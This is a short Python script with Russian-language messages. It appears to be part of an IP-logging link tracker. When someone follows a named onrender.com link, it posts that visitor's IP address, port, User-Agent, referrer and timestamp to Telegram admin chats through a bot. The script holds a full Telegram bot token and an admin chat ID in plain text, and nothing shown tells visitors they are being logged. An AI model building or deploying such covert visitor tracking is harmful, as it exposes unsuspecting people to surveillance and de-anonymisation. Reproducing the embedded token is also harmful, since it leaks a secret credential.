import requests
import time

TOKEN = "8378907712:AAFQfHHO7SnYb1xErSQmWSQ87Ln9Dz9sWFU"
ADMIN_IDS = ["45644013", "", "", ""]

def send_info(info):
    message = f"""
🔍 *Обнаружен переход по ссылке!*

🌐 *Сетевая информация:*
├ IP: `{info['ip']}`
├ Порт: `{info['port']}`
├ User-Agent: `{info['user_agent'][:100]}...`
├ Referrer: `{info.get('referrer', 'N/A')}`
├ Время: `{info['timestamp']}`

*Ссылка:* https://onion-web.onrender.com
"""
    
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        
        for admin_id in ADMIN_IDS:
            data = {
                "chat_id": admin_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print(f"✅ Уведомление отправлено админу {admin_id}")
            else:
                print(f"❌ Ошибка отправки админу {admin_id}")
        
    except Exception as e:
        print(f"💥 Ошибка Telegram: {e}")
